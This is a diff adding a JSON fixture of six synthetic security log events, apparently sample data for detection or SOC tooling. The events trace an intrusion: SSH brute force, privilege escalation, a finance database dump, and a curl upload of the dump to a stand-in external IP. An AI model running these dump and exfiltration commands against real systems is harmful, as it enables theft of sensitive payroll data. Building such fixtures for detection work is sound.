@@ -1,0 +1,124 @@
+[
+  {
+    "event_id": "evt_2026_0042_001",
+    "timestamp": "2026-08-20T10:01:15Z",
+    "source": "wazuh",
+    "event_type": "authentication_failure",
+    "severity": "medium",
+    "user": "admin01",
+    "source_ip": "10.10.10.45",
+    "destination_ip": "10.20.1.10",
+    "host": "AUTH-SRV-01",
+    "process": "sshd",
+    "command": "login_attempt --user=admin01",
+    "asset_id": "asset_auth_01",
+    "asset_criticality": "high",
+    "raw_log": "Aug 20 10:01:15 AUTH-SRV-01 sshd[4412]: Failed password for admin01 from 10.10.10.45 port 52311 ssh2 (Attempt 12)",
+    "metadata": {
+      "failed_attempts": 12,
+      "auth_method": "password"
+    }
+  },
+  {
+    "event_id": "evt_2026_0042_002",
+    "timestamp": "2026-08-20T10:03:42Z",
+    "source": "wazuh",
+    "event_type": "authentication_success",
+    "severity": "low",
+    "user": "admin01",
+    "source_ip": "10.10.10.45",
+    "destination_ip": "10.20.1.10",
+    "host": "AUTH-SRV-01",
+    "process": "sshd",
+    "command": "session_open --user=admin01",
+    "asset_id": "asset_auth_01",
+    "asset_criticality": "high",
+    "raw_log": "Aug 20 10:03:42 AUTH-SRV-01 sshd[4490]: Accepted password for admin01 from 10.10.10.45 port 52388 ssh2",
+    "metadata": {
+      "session_id": "sess_88392",
+      "mfa_enforced": false
+    }
+  },
+  {
+    "event_id": "evt_2026_0042_003",
+    "timestamp": "2026-08-20T10:05:08Z",
+    "source": "windows_eventlog",
+    "event_type": "privilege_escalation",
+    "severity": "high",
+    "user": "admin01",
+    "source_ip": "10.10.10.45",
+    "destination_ip": "10.20.1.15",
+    "host": "DC-01",
+    "process": "powershell.exe",
+    "command": "Add-LocalGroupMember -Group 'Administrators' -Member 'admin01'",
+    "asset_id": "asset_dc_01",
+    "asset_criticality": "critical",
+    "raw_log": "EventID 4728: A member was added to a security-enabled global group. Target: Administrators, Member: admin01",
+    "metadata": {
+      "privilege_granted": "Domain Admin",
+      "elevation_mechanism": "Token Impersonation"
+    }
+  },
+  {
+    "event_id": "evt_2026_0042_004",
+    "timestamp": "2026-08-20T10:07:30Z",
+    "source": "db_audit",
+    "event_type": "database_access",
+    "severity": "medium",
+    "user": "admin01",
+    "source_ip": "10.10.10.45",
+    "destination_ip": "10.20.2.50",
+    "host": "FIN-DB-01",
+    "process": "postgres",
+    "command": "SELECT * FROM payroll_records JOIN executive_salaries ON 1=1;",
+    "asset_id": "asset_fin_db_01",
+    "asset_criticality": "critical",
+    "raw_log": "Aug 20 10:07:30 FIN-DB-01 postgres[19283]: [3-1] LOG: statement: SELECT * FROM payroll_records JOIN executive_salaries ON 1=1;",
+    "metadata": {
+      "database": "FinanceDB",
+      "schema": "sensitive_hr",
+      "rows_returned": 14500
+    }
+  },
+  {
+    "event_id": "evt_2026_0042_005",
+    "timestamp": "2026-08-20T10:12:05Z",
+    "source": "db_audit",
+    "event_type": "data_collection",
+    "severity": "high",
+    "user": "admin01",
+    "source_ip": "10.10.10.45",
+    "destination_ip": "10.20.2.50",
+    "host": "FIN-DB-01",
+    "process": "pg_dump",
+    "command": "pg_dump -U admin01 -d FinanceDB -f /tmp/fin_dump.tar.gz",
+    "asset_id": "asset_fin_db_01",
+    "asset_criticality": "critical",
+    "raw_log": "Aug 20 10:12:05 FIN-DB-01 postgres[19844]: Bulk export initiated by user admin01. Size: 1.42 GB",
+    "metadata": {
+      "export_file": "/tmp/fin_dump.tar.gz",
+      "size_bytes": 1524839200
+    }
+  },
+  {
+    "event_id": "evt_2026_0042_006",
+    "timestamp": "2026-08-20T10:18:19Z",
+    "source": "network_flow",
+    "event_type": "data_exfiltration",
+    "severity": "critical",
+    "user": "admin01",
+    "source_ip": "10.20.2.50",
+    "destination_ip": "198.51.100.77",
+    "host": "FIN-DB-01",
+    "process": "curl",
+    "command": "curl -F 'file=@/tmp/fin_dump.tar.gz' https://198.51.100.77/upload",
+    "asset_id": "asset_fin_db_01",
+    "asset_criticality": "critical",
+    "raw_log": "Aug 20 10:18:19 NetFlow: Outbound session 10.20.2.50:49152 -> 198.51.100.77:443 transferred 1.45 GB",
+    "metadata": {
+      "destination_country": "External",
+      "protocol": "HTTPS",
+      "bytes_sent": 1556938400
+    }
+  }
+]
